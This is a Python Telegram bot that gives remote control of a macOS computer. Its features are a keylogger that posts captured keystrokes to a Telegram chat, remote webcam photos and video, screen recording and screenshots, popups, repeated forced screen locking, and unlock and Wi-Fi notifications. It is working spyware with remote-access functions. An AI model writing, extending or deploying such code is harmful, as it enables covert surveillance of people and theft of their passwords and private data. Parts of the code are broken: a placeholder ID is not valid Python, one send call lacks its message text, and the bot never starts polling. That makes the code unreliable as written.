import telebot
import subprocess
import os
import time
from datetime import datetime, timedelta
import threading
import requests

# --- NEW DEPENDENCIES (Install these: pip3 install pynput --user) ---
from pynput import keyboard

# --- Configuration ---
BOT_TOKEN = "your_token_here"
AUTHORIZED_CHAT_ID = your_id_here

IMAGESNAP_PATH = "/opt/homebrew/bin/imagesnap" # Adjust if your path is different
FFMPEG_PATH = "/opt/homebrew/bin/ffmpeg"     # Adjust if your path is different
# SCREENCAPTURE_PATH is usually /usr/sbin/screencapture, which is in the default PATH

# --- Bot Initialization ---
bot = telebot.TeleBot(BOT_TOKEN)

# --- Global variables for features ---
lockdown_active = False
lockdown_repeating_timer = None
lockdown_end_timer = None
LOCKDOWN_INTERVAL = 3

wifi_monitor_active = True
wifi_monitor_timer = None
last_wifi_power_state = "initial_unknown"
wifi_disabled_timestamp = None
last_known_internet_state = "initial_unknown"
WIFI_MONITOR_INTERVAL = 10

keylogger_active = False
key_buffer = []
key_log_timer = None
KEY_LOG_TIMEOUT = 3
keylogger_listener_object = None # pynput listener object

# Screen Unlock Monitoring Globals
screen_was_locked_by_loginwindow = True # Assume initially locked or state unknown
screen_unlock_monitor_timer = None
SCREEN_UNLOCK_MONITOR_INTERVAL = 15 # Check every 15 seconds

# --- Helper Functions (Existing and New) ---
def show_macos_popup(message_text):
    escaped_message = message_text.replace('"', '\\"')
    applescript_command = f'display dialog "{escaped_message}" with title "Alert" buttons {{"OK"}} default button "OK"'
    try:
        subprocess.run(["osascript", "-e", applescript_command], check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"AppleScript error: {e.stderr.decode()}", flush=True)
        return False
    except Exception as e:
        print(f"Unexpected error in show_macos_popup: {e}", flush=True)
        return False

def take_screenshot_and_send(chat_id):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = f"/tmp/screenshot_{timestamp}.png"
    try:
        # -x: do not play sounds. Default captures the whole screen.
        subprocess.run(["screencapture", "-x", screenshot_path], check=True, capture_output=True)
        with open(screenshot_path, "rb") as photo:
            bot.send_photo(chat_id, photo, caption=f"Desktop screenshot taken at {timestamp}.")
        print(f"Screenshot sent: {screenshot_path}", flush=True)
        return True
    except FileNotFoundError:
        bot.send_message(chat_id, "Error: 'screencapture' command not found. Is this macOS?")
        print("Error: 'screencapture' command not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        bot.send_message(chat_id, f"Error taking screenshot: {e.stderr.decode()}")
        print(f"Error taking screenshot: {e.stderr.decode()}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred: {e}")
        print(f"Unexpected error in screenshot function: {e}", flush=True)
        return False
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            print(f"Removed temporary screenshot: {screenshot_path}", flush=True)

def record_screen_and_send(chat_id, duration_seconds):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    raw_video_path = f"/tmp/screenrec_raw_{timestamp}.mov"
    final_video_path = f"/tmp/screenrec_final_{timestamp}.mp4"
    screencapture_command = ["screencapture", "-V", str(duration_seconds), "-x", "-k", raw_video_path]

    try:
        bot.send_message(chat_id, f"Starting screen recording for {duration_seconds} seconds...")
        print(f"Executing screencapture: {' '.join(screencapture_command)}", flush=True)
        capture_process = subprocess.run(screencapture_command, check=True, capture_output=True)
        print(f"Screencapture stdout: {capture_process.stdout.decode()}", flush=True)
        print(f"Screencapture stderr: {capture_process.stderr.decode()}", flush=True)

        if not os.path.exists(raw_video_path) or os.path.getsize(raw_video_path) == 0:
            bot.send_message(chat_id, "Screen recording failed: Raw video file not created or is empty.")
            print(f"Raw video file missing or empty: {raw_video_path}", flush=True)
            return False

        bot.send_message(chat_id, "Screen recording complete. Converting video to MP4...")
        print(f"Converting {raw_video_path} to {final_video_path} using ffmpeg...", flush=True)
        ffmpeg_command = [
            FFMPEG_PATH, "-i", raw_video_path,
            "-c:v", "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p",
            "-crf", "23", "-movflags", "+faststart", final_video_path
        ]
        convert_process = subprocess.run(ffmpeg_command, check=True, capture_output=True)
        print(f"FFmpeg convert stdout: {convert_process.stdout.decode()}", flush=True)
        print(f"FFmpeg convert stderr: {convert_process.stderr.decode()}", flush=True)

        if os.path.exists(final_video_path) and os.path.getsize(final_video_path) > 0:
            with open(final_video_path, "rb") as video_file:
                bot.send_video(chat_id, video_file, caption=f"Screen recording ({duration_seconds}s) from {timestamp}.")
            print(f"Screen recording sent: {final_video_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Video conversion failed or output file is empty.")
            print(f"Final video file missing or empty: {final_video_path}", flush=True)
            return False

    except FileNotFoundError as e:
        if str(e).startswith("[Errno 2] No such file or directory: 'screencapture'"):
            msg = "Error: 'screencapture' command not found. Is this macOS?"
        elif FFMPEG_PATH in str(e):
            msg = f"Error: Command '{FFMPEG_PATH}' not found. Is the path correct and ffmpeg installed?"
        else:
            msg = f"File not found error: {e}"
        bot.send_message(chat_id, msg)
        print(msg, flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_source = "screencapture" if e.cmd[0] == "screencapture" else "ffmpeg"
        error_details = f"Command: {' '.join(e.cmd)}\nReturn Code: {e.returncode}\n"
        if e.stdout: error_details += f"STDOUT: {e.stdout.decode(errors='ignore')}\n"
        if e.stderr: error_details += f"STDERR: {e.stderr.decode(errors='ignore')}"
        bot.send_message(chat_id, f"Error during {error_source} execution. Check bot logs.")
        print(f"Error during {error_source}: {error_details}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred during screen recording: {e}")
        print(f"Unexpected error in record_screen_and_send: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return False
    finally:
        if os.path.exists(raw_video_path): os.remove(raw_video_path)
        if os.path.exists(final_video_path): os.remove(final_video_path)

def lock_macos_screen():
    try:
        # This is the standard "Lock Screen" shortcut (Ctrl-Cmd-Q)
        applescript_command = 'tell application "System Events" to keystroke "q" using {control down, command down}'
        subprocess.run(["osascript", "-e", applescript_command], check=True)
        print("Screen locked successfully using AppleScript.", flush=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error locking screen with AppleScript: {e.stderr.decode() if e.stderr else e}", flush=True)
        return False
    except Exception as e:
        print(f"Unexpected error in lock_macos_screen: {e}", flush=True)
        return False

def start_repeating_lock(chat_id):
    global lockdown_active, lockdown_repeating_timer
    if lockdown_active:
        print("Lockdown already active.", flush=True)
        return
    lockdown_active = True
    bot.send_message(chat_id, "Lockdown sequence initiated. Screen will re-lock.")
    def repeating_lock_task():
        if lockdown_active:
            print(f"Executing timed lock (active={lockdown_active}).", flush=True)
            lock_macos_screen()
            global lockdown_repeating_timer # Ensure we are modifying the global
            if lockdown_repeating_timer: lockdown_repeating_timer.cancel()
            lockdown_repeating_timer = threading.Timer(LOCKDOWN_INTERVAL, repeating_lock_task)
            lockdown_repeating_timer.start()
        else:
            print("Lockdown became inactive. Stopping repeating lock task.", flush=True)
            if lockdown_repeating_timer:
                lockdown_repeating_timer.cancel()
    lock_macos_screen() # Lock immediately
    if lockdown_repeating_timer: lockdown_repeating_timer.cancel() # Cancel any pre-existing
    lockdown_repeating_timer = threading.Timer(LOCKDOWN_INTERVAL, repeating_lock_task)
    lockdown_repeating_timer.start()

def stop_repeating_lock(chat_id=None):
    global lockdown_active, lockdown_repeating_timer, lockdown_end_timer
    if not lockdown_active:
        if chat_id: bot.send_message(chat_id, "Lockdown is not currently active, Cambria.")
        return
    lockdown_active = False
    if lockdown_repeating_timer:
        lockdown_repeating_timer.cancel()
        lockdown_repeating_timer = None
    if lockdown_end_timer:
        lockdown_end_timer.cancel()
        lockdown_end_timer = None
    print("Lockdown stopped.", flush=True)
    if chat_id: bot.send_message(chat_id, "Lockdown cancelled, Cambria.")

def get_wifi_status():
    try:
        result = subprocess.run(["networksetup", "-getairportpower", "en0"], capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        if "Wi-Fi Power (en0): On" in output: return "on"
        elif "Wi-Fi Power (en0): Off" in output: return "off"
        else:
            print(f"Unexpected Wi-Fi status output: {output}", flush=True)
            return "unknown"
    except FileNotFoundError:
        print("Error: 'networksetup' command not found.", flush=True)
        return "error"
    except subprocess.CalledProcessError as e:
        if "not a Wi-Fi interface" in e.stderr.strip().lower():
             print(f"Wi-Fi check error: en0 is not a Wi-Fi interface. Output: {e.stderr.strip()}", flush=True)
        else:
            print(f"Error running networksetup: {e.stderr.strip()}", flush=True)
        return "error"
    except Exception as e:
        print(f"Unexpected error checking Wi-Fi: {e}", flush=True)
        return "error"

def perform_connect_test():
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "5000", "1.1.1.1"], capture_output=True, text=True, check=False) # Allow non-zero return
        if result.returncode == 0:
            return True, "Ping to 1.1.1.1 successful."
        else:
            return False, f"Ping to 1.1.1.1 failed. Output:\n{result.stdout.strip()}\n{result.stderr.strip()}"
    except FileNotFoundError:
        return False, "Error: 'ping' command not found."
    except Exception as e:
        return False, f"Unexpected error during connect test: {e}"

def wifi_monitoring_task(chat_id_param):
    global wifi_monitor_active, wifi_monitor_timer, last_wifi_power_state, wifi_disabled_timestamp
    global last_known_internet_state
    if not wifi_monitor_active:
        print("Wi-Fi monitoring inactive. Stopping task.", flush=True)
        if wifi_monitor_timer: wifi_monitor_timer.cancel()
        return

    current_wifi_power = get_wifi_status()

    if last_known_internet_state == "initial_unknown": # First run logic
        print(f"Initial Wi-Fi radio power: {current_wifi_power}", flush=True)
        initial_message_parts = [f"Wi-Fi & Internet monitoring started, Cambria."]
        initial_message_parts.append(f"Radio: {current_wifi_power.upper()}")
        if current_wifi_power == "on":
            is_connected, _ = perform_connect_test()
            if is_connected:
                last_known_internet_state = "connected"
                initial_message_parts.append("Internet: CONNECTED")
            else:
                last_known_internet_state = "disconnected"
                initial_message_parts.append("Internet: DISCONNECTED")
        elif current_wifi_power == "off":
            last_known_internet_state = "disconnected"
            wifi_disabled_timestamp = datetime.now()
        else: # error or unknown
            last_known_internet_state = "disconnected" # Assume worst case
        last_wifi_power_state = current_wifi_power
        try:
            bot.send_message(chat_id_param, " ".join(initial_message_parts) + ".")
        except Exception as e:
            print(f"Error sending initial Wi-Fi/Internet status message: {e}", flush=True)
    else: # Subsequent runs
        if current_wifi_power == "off" and last_wifi_power_state == "on":
            print(f"Wi-Fi radio turned OFF (was {last_wifi_power_state}). Internet considered DISCONNECTED.", flush=True)
            wifi_disabled_timestamp = datetime.now()
            if last_known_internet_state == "connected": # Only notify if it was previously connected
                try:
                    bot.send_message(chat_id_param, "⚠️ WARNING: Wi-Fi radio has been turned OFF, Cambria. Internet is now disconnected.")
                except Exception as e:
                    print(f"Error sending Wi-Fi OFF message: {e}", flush=True)
            last_known_internet_state = "disconnected"
        elif current_wifi_power == "on":
            is_connected_now, connect_msg = perform_connect_test()
            if is_connected_now:
                if last_known_internet_state == "disconnected": # Was disconnected, now connected
                    print(f"Internet connectivity test PASSED: {connect_msg}", flush=True)
                    online_message = "✅ Internet is back ONLINE, Cambria! (Connection test passed)"
                    if wifi_disabled_timestamp:
                        online_message += f"\nWi-Fi radio was previously off since: {wifi_disabled_timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
                    try:
                        bot.send_message(chat_id_param, online_message)
                    except Exception as e:
                        print(f"Error sending Internet back ONLINE message: {e}", flush=True)
                    wifi_disabled_timestamp = None # Clear timestamp as we are online
                last_known_internet_state = "connected"
            else: # Wi-Fi on, but no internet
                print(f"Wi-Fi radio is ON, but internet connectivity test FAILED: {connect_msg}", flush=True)
                if last_known_internet_state == "connected": # Was connected, now connection lost despite Wi-Fi on
                    try:
                        bot.send_message(chat_id_param, "⚠️ WARNING: Internet connection LOST while Wi-Fi radio is ON, Cambria.")
                    except Exception as e:
                        print(f"Error sending Internet LOST (Wi-Fi ON) message: {e}", flush=True)
                # Optional: notify if Wi-Fi just turned on but no internet yet
                # elif last_wifi_power_state != "on":
                #     bot.send_message(chat_id_param, f"ℹ️ Wi-Fi radio is ON, but internet is not yet active, Cambria. Will keep checking.")
                last_known_internet_state = "disconnected"
        elif current_wifi_power in ["error", "unknown"]:
             print(f"Wi-Fi radio status check returned: {current_wifi_power}. Last valid power state was {last_wifi_power_state}. Internet state remains {last_known_internet_state}.", flush=True)
        
        # Update last_wifi_power_state only if it's a valid determined state
        if current_wifi_power in ["on", "off"]:
            last_wifi_power_state = current_wifi_power

    # Reschedule
    if wifi_monitor_active:
        if wifi_monitor_timer:
            wifi_monitor_timer.cancel()
        wifi_monitor_timer = threading.Timer(WIFI_MONITOR_INTERVAL, wifi_monitoring_task, args=(chat_id_param,))
        wifi_monitor_timer.start()

def take_webcam_photo_and_send(chat_id):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    photo_path = f"/tmp/webcam_photo_{timestamp}.jpg"
    command = [IMAGESNAP_PATH, "-w", "1", photo_path] # -w 1 is a short delay
    try:
        bot.send_message(chat_id, "Capturing photo from webcam...")
        subprocess.run(command, check=True, capture_output=True)
        if os.path.exists(photo_path):
            with open(photo_path, "rb") as p:
                bot.send_photo(chat_id, p, caption=f"Webcam photo taken at {timestamp}, Cambria.")
            print(f"Webcam photo sent: {photo_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Failed to capture photo. File not found after command execution.")
            print(f"Webcam photo not found at {photo_path} after imagesnap command.", flush=True)
            return False
    except FileNotFoundError:
        bot.send_message(chat_id, f"Error: Command '{IMAGESNAP_PATH}' not found. Is the path correct and imagesnap installed?")
        print(f"Error: Command '{IMAGESNAP_PATH}' not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_message = e.stderr.decode() if e.stderr else str(e)
        bot.send_message(chat_id, f"Error taking webcam photo: {error_message}")
        print(f"Error taking webcam photo: {error_message}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred while taking webcam photo: {e}")
        print(f"Unexpected error in take_webcam_photo_and_send: {e}", flush=True)
        return False
    finally:
        if os.path.exists(photo_path):
            os.remove(photo_path)
            print(f"Removed temporary webcam photo: {photo_path}", flush=True)

def record_webcam_video_and_send(chat_id, duration_seconds):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    video_path = f"/tmp/webcam_video_{timestamp}.mp4"
    # Using avfoundation for macOS, default device "0" (camera), no audio "none"
    command = [
        FFMPEG_PATH,
        "-f", "avfoundation", "-framerate", "30", "-video_size", "640x480", "-i", "0:none", # 0 for video, none for audio
        "-t", str(duration_seconds),
        "-c:v", "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p",
        video_path
    ]
    try:
        bot.send_message(chat_id, f"Recording video from webcam for {duration_seconds} seconds...")
        process = subprocess.run(command, check=True, capture_output=True)
        # print(f"FFmpeg stdout: {process.stdout.decode()}", flush=True) # Often empty for successful video
        # print(f"FFmpeg stderr: {process.stderr.decode()}", flush=True) # Contains encoding info
        if os.path.exists(video_path) and os.path.getsize(video_path) > 0:
            with open(video_path, "rb") as v:
                bot.send_video(chat_id, v, caption=f"Webcam video ({duration_seconds}s) recorded at {timestamp}, Cambria.")
            print(f"Webcam video sent: {video_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Failed to record video. Output file not found or is empty after command execution.")
            print(f"Webcam video not found or empty at {video_path} after ffmpeg command. FFmpeg stderr: {process.stderr.decode()}", flush=True)
            return False
    except FileNotFoundError:
        bot.send_message(chat_id, f"Error: Command '{FFMPEG_PATH}' not found. Is the path correct and ffmpeg installed?")
        print(f"Error: Command '{FFMPEG_PATH}' not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_message = f"FFmpeg Error Output:\nSTDERR: {e.stderr.decode(errors='ignore') if e.stderr else 'N/A'}\nSTDOUT: {e.stdout.decode(errors='ignore') if e.stdout else 'N/A'}"
        bot.send_message(chat_id, f"Error recording webcam video. Check bot logs for FFmpeg output.")
        print(f"Error recording webcam video: {error_message}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred while recording webcam video: {e}")
        print(f"Unexpected error in record_webcam_video_and_send: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return False
    finally:
        if os.path.exists(video_path):
            os.remove(video_path)
            print(f"Removed temporary webcam video: {video_path}", flush=True)


# --- Keylogger Functions ---
def send_key_log():
    global key_buffer, key_log_timer
    if key_log_timer:
        key_log_timer.cancel()
        key_log_timer = None
    if key_buffer:
        log_message = "".join(key_buffer)
        try:
            max_len = 4090 # Telegram message length limit
            for i in range(0, len(log_message), max_len):
                chunk = log_message[i:i+max_len]
                bot.send_message(AUTHORIZED_CHAT_ID, f"Key Log:\n{chunk}")
            print(f"Sent key log: {len(log_message)} chars", flush=True)
        except Exception as e:
            print(f"Error sending key log: {e}", flush=True)
        key_buffer = [] # Clear buffer after sending

def on_press(key):
    global key_buffer, key_log_timer, keylogger_active
    if not keylogger_active:
        return False # Stop listener if not active

    if key_log_timer:
        key_log_timer.cancel()

    try:
        key_buffer.append(key.char)
    except AttributeError: # Special keys
        if key == keyboard.Key.space: key_buffer.append(' ')
        elif key == keyboard.Key.enter: key_buffer.append('\n')
        elif key == keyboard.Key.tab: key_buffer.append('\t')
        else:
            # Avoid logging simple modifiers if they are pressed alone
            # but log functional special keys like backspace, delete, arrows etc.
            key_name = str(key).replace("Key.", "")
            # Filter out common modifier keys unless you want them explicitly
            # e.g. 'shift', 'ctrl_l', 'cmd', 'alt'
            # For this example, we log most special keys.
            if key_name not in ['shift', 'ctrl', 'alt', 'cmd', 'shift_r', 'ctrl_r', 'alt_r', 'cmd_r', 'alt_gr', 'caps_lock']:
                 key_buffer.append(f'[{key_name}]')


    key_log_timer = threading.Timer(KEY_LOG_TIMEOUT, send_key_log)
    key_log_timer.start()
    return True


def start_keylogger_listener():
    global keylogger_listener_object
    try:
        print("Attempting to start keylogger listener. Ensure Accessibility permissions are granted for Python/Terminal.", flush=True)
        # Create and start the listener in the current thread context
        # pynput listener runs its own thread internally when .start() is called.
        # .join() would block, .start() does not.
        keylogger_listener_object = keyboard.Listener(on_press=on_press)
        keylogger_listener_object.start() # Starts a new thread for the listener
        print("Keylogger listener started successfully.", flush=True)
        return True
    except Exception as e: # Catch broad exceptions, pynput can raise various errors
        print(f"Error starting pynput listener: {e}", flush=True)
        # Check if it's a RuntimeError related to macOS permissions
        if "failed to post event tap" in str(e).lower() or " događaja nije uspjelo" in str(e).lower(): # "postavljanje prisluškivača događaja nije uspjelo"
             bot.send_message(AUTHORIZED_CHAT_ID, "Keylogger Error: Failed to set up event tap. This usually means Python/Terminal needs Accessibility permissions in System Settings > Privacy & Security.")
        else:
            bot.send_message(AUTHORIZED_CHAT_ID, f"Error starting keylogger: {e}.")
        return False

def stop_keylogger_listener():
    global keylogger_listener_object, keylogger_active
    keylogger_active = False # Signal on_press to stop processing
    if keylogger_listener_object:
        print("Attempting to stop keylogger listener...", flush=True)
        keylogger_listener_object.stop() # Request the listener thread to stop
        # keylogger_listener_object.join() # Optional: wait for listener thread to finish
        keylogger_listener_object = None
        print("Keylogger listener stop requested.", flush=True)
    send_key_log() # Send any remaining buffered keys

# --- NEW: Screen Unlock Detection Functions ---
def is_screen_locked_apple_script():
    """
    Checks if the screen is locked by seeing if 'loginwindow' is the frontmost application.
    Returns True if locked, False if unlocked, None on error or if UI interaction is not possible.
    """
    applescript_command = 'tell application "System Events" to get name of first process whose frontmost is true'
    try:
        # Timeout is important in case osascript hangs
        result = subprocess.run(["osascript", "-e", applescript_command], capture_output=True, text=True, check=True, timeout=5)
        frontmost_app = result.stdout.strip()
        # print(f"DEBUG: Frontmost app: '{frontmost_app}'", flush=True) # For debugging
        if "loginwindow" == frontmost_app:
            return True # Screen is locked or at login window
        return False # Screen is unlocked, other app is frontmost
    except subprocess.CalledProcessError as e:
        # This can happen if osascript fails (e.g. no GUI session, permission issues for System Events)
        # Error 252: "Application isn't running." if System Events isn't accessible.
        print(f"AppleScript error checking screen lock state (CalledProcessError): {e.stderr}", flush=True)
        return None
    except subprocess.TimeoutExpired:
        print("AppleScript timeout checking screen lock state.", flush=True)
        return None
    except Exception as e: # Catch any other unexpected errors
        print(f"Unexpected error in is_screen_locked_apple_script: {e}", flush=True)
        return None

def screen_unlock_monitoring_task(chat_id_param):
    global screen_was_locked_by_loginwindow, screen_unlock_monitor_timer

    current_lock_state = is_screen_locked_apple_script()

    if current_lock_state is None:
        print("Screen lock status check failed or indeterminate. Will retry.", flush=True)
        # Potentially notify Cambria if this persists? For now, just retry.
    elif current_lock_state is False: # Screen is determined to be UNLOCKED
        if screen_was_locked_by_loginwindow: # It was previously locked or unknown
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"🔓 Mac appears to have been logged into / unlocked at {timestamp}, Cambria."
            try:
                bot.send_message(chat_id_param, message)
                print(message, flush=True)
            except Exception as e:
                print(f"Error sending screen unlock message: {e}", flush=True)
            screen_was_locked_by_loginwindow = False # Update state to unlocked
        # else: screen was already known to be unlocked, no change, do nothing
    elif current_lock_state is True: # Screen is determined to be LOCKED
        if not screen_was_locked_by_loginwindow: # It was previously unlocked
            print(f"Screen became locked/is at loginwindow at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.", flush=True)
            # No message to Cambria for locking, just updating state
        screen_was_locked_by_loginwindow = True # Update state to locked

    # Reschedule the monitor task
    if screen_unlock_monitor_timer: # Should always exist if task is running
        screen_unlock_monitor_timer.cancel()
    screen_unlock_monitor_timer = threading.Timer(SCREEN_UNLOCK_MONITOR_INTERVAL, screen_unlock_monitoring_task, args=(chat_id_param,))
    screen_unlock_monitor_timer.start()

# --- Message Handlers (Existing and New) ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    if message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, f"Hello, Cambria! I'm ready. Your chat ID is {message.chat.id}.")
        prereq_info = (
            "For /photo & /video: 'imagesnap' & 'ffmpeg' needed. Grant Camera permissions.\n"
            "For /startkeylogger: 'pynput' needed. Grant Accessibility permissions.\n"
            "For /screenrecord: Grant Screen Recording permissions for Python/Terminal.\n"
            "For screenshot (/ss): Grant Screen Recording permissions for Python/Terminal.\n"
            "\nAll permissions are typically granted to the 'Terminal' or 'Python' application in System Settings > Privacy & Security."
            "\nUnlock detection is active. You'll be notified on screen unlock."
        )
        bot.send_message(message.chat.id) # Corrected this line
    else:
        print(f"Unauthorized access with /start from Chat ID: {message.chat.id}.", flush=True)

@bot.message_handler(commands=["help"])
def handle_help(message):
    if message.chat.id == AUTHORIZED_CHAT_ID:
        help_text = """
Available commands, Cambria:
/start - Welcome message & user ID.
/help - This help message.
/popup <text> - Shows a macOS popup.
/ss - Takes a desktop screenshot.
/screenrecord <seconds> - Records the screen for a duration and sends the video.
/lock - Locks the macOS screen.
/photo - Takes a photo from the webcam.
/video <seconds> - Records a video from the webcam.
/startkeylogger - Starts the keylogger.
/stopkeylogger - Stops the keylogger and sends final log.
/test - Performs an internet connection test.
/lockdown [seconds] - Repeatedly locks screen. Use 0 or no arg for indefinite.
/cancellockdown - Cancels lockdown.

Passive features:
- Wi-Fi & Internet connection monitoring.
- Screen unlock (login) notifications.
"""
        try:
            bot.reply_to(message, help_text)
        except Exception as e:
            print(f"Error sending help message: {e}", flush=True)
    else:
        print(f"Unauthorized access with /help from Chat ID: {message.chat.id}.", flush=True)

@bot.message_handler(commands=["popup"])
def handle_popup(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    popup_text = message.text.replace("/popup", "", 1).strip()
    if popup_text:
        if show_macos_popup(popup_text): bot.reply_to(message, "Popup displayed!")
        else: bot.reply_to(message, "Failed to display popup.")
    else: bot.reply_to(message, "Usage: /popup <text>")

@bot.message_handler(commands=["ss"])
def handle_screenshot(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    if not take_screenshot_and_send(message.chat.id):
        # Error message is sent from within the function
        print("handle_screenshot: failure reported by take_screenshot_and_send.", flush=True)

@bot.message_handler(commands=["screenrecord"])
def handle_screen_record(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /screenrecord from {message.chat.id}", flush=True)
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /screenrecord <seconds>\nExample: /screenrecord 15")
        return

    try:
        duration = int(args[1])
        if not (5 <= duration <= 300): # Min 5s, Max 5min
            bot.reply_to(message, "Duration must be between 5 and 300 seconds.")
            return
        record_screen_and_send(message.chat.id, duration)
    except ValueError:
        bot.reply_to(message, "Invalid duration. Must be a number. Usage: /screenrecord <seconds>")
    except Exception as e: # Generic catch for other errors during command processing
        bot.send_message(message.chat.id, f"An error occurred with the screenrecord command: {e}")
        print(f"Error in handle_screen_record: {e}", flush=True)

@bot.message_handler(commands=["lock"])
def handle_lock_screen(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    bot.send_message(message.chat.id, "Attempting to lock screen...")
    if lock_macos_screen(): bot.send_message(message.chat.id, "Screen lock command sent.")
    else: bot.send_message(message.chat.id, "Failed to send screen lock command. Check logs.")

@bot.message_handler(commands=["photo"])
def handle_webcam_photo(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    take_webcam_photo_and_send(message.chat.id)

@bot.message_handler(commands=["video"])
def handle_webcam_video(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /video <seconds>\nExample: /video 10")
        return
    try:
        duration = int(args[1])
        if not (1 <= duration <= 300) : # Min 1s, Max 5min
            bot.reply_to(message, "Duration must be between 1 and 300 seconds.")
            return
        record_webcam_video_and_send(message.chat.id, duration)
    except ValueError: bot.reply_to(message, "Invalid duration. Must be a number. Usage: /video <seconds>")
    except Exception as e: bot.send_message(message.chat.id, f"An error occurred with the video command: {e}")

@bot.message_handler(commands=["test"])
def handle_connect_test(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    bot.send_message(message.chat.id, "Performing internet connection test...")
    success, result_message = perform_connect_test()
    reply = f"✅ Test successful!\n{result_message}" if success else f"❌ Test failed.\n{result_message}"
    bot.send_message(message.chat.id, reply)

@bot.message_handler(commands=["lockdown"])
def handle_lockdown(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    global lockdown_end_timer # Make sure we're referring to the global
    if lockdown_active:
        bot.send_message(message.chat.id, "Lockdown already active.")
        return
    args = message.text.split()
    duration_seconds = 0 # Default to indefinite
    if len(args) > 1:
        try:
            duration_seconds = int(args[1])
            if duration_seconds < 0: # Allow 0 for indefinite
                bot.reply_to(message, "Duration must be a non-negative number of seconds (0 for indefinite).")
                return
        except ValueError:
            bot.reply_to(message, "Invalid duration. Usage: /lockdown [seconds] (0 or no arg for indefinite)")
            return
    
    if lockdown_end_timer: lockdown_end_timer.cancel() # Clear any existing end timer

    if duration_seconds > 0:
        bot.send_message(message.chat.id, f"Starting lockdown for {duration_seconds} seconds.")
        start_repeating_lock(message.chat.id) # This will send its own message
        lockdown_end_timer = threading.Timer(duration_seconds, stop_repeating_lock, args=(message.chat.id,))
        lockdown_end_timer.start()
    else: # Indefinite lockdown
        bot.send_message(message.chat.id, "Starting indefinite lockdown.")
        start_repeating_lock(message.chat.id)
        lockdown_end_timer = None # Ensure no end timer is active

@bot.message_handler(commands=["cancellockdown"])
def handle_cancel_lockdown(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    stop_repeating_lock(message.chat.id) # This will send its own message


# --- Keylogger Command Handlers ---
@bot.message_handler(commands=["startkeylogger"])
def handle_start_keylogger(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /startkeylogger from {message.chat.id}", flush=True)
        return
    global keylogger_active
    if keylogger_active:
        bot.send_message(message.chat.id, "Keylogger is already active.")
        return

    keylogger_active = True
    key_buffer.clear() # Clear any old buffer
    if start_keylogger_listener(): # This now handles sending error messages on failure
        bot.send_message(message.chat.id, "Keylogger started. Keystrokes will be logged.")
    else:
        keylogger_active = False # Ensure it's marked inactive on failure
        # Error message sent by start_keylogger_listener

@bot.message_handler(commands=["stopkeylogger"])
def handle_stop_keylogger(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /stopkeylogger from {message.chat.id}", flush=True)
        return
    global keylogger_active # Not strictly needed here as stop_keylogger_listener handles it
    if not keylogger_active: # Check before trying to stop
        bot.send_message(message.chat.id, "Keylogger is not currently active.")
        return

    stop_keylogger_listener() # This sets keylogger_active to False and sends final log
    bot.send_message(message.chat.id, "Keylogger stopped. Final log (if any) sent.")


# --- Start Bot Polling ---
if __name__ == "__main__":
    if not BOT_TOKEN or BOT_TOKEN == "var" or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE": # Added "var"
        print("CRITICAL: BOT_TOKEN is not set or is a placeholder. Please replace 'var' or the placeholder. Exiting.", flush=True)
        exit(1)
    if not AUTHORIZED_CHAT_ID or AUTHORIZED_CHAT_ID == 0: # Added placeholder example
        print("CRITICAL: AUTHORIZED_CHAT_ID is not set or is a placeholder. Please set it to your actual chat ID. Exiting.", flush=True)
        print("         You can get your chat ID by sending /start to @userinfobot or similar bots.", flush=True)
        exit(1)
    if not os.path.exists(IMAGESNAP_PATH) or not os.path.exists(FFMPEG_PATH):
        missing = []
        if not os.path.exists(IMAGESNAP_PATH): missing.append(f"IMAGESNAP_PATH ({IMAGESNAP_PATH})")
        if not os.path.exists(FFMPEG_PATH): missing.append(f"FFMPEG_PATH ({FFMPEG_PATH})")
        print(f"CRITICAL: One or more command-line tools not found at specified paths: {', '.join(missing)}. Please check these paths. Exiting.", flush=True)
        exit(1)

    print("Telegram bot starting...", flush=True)
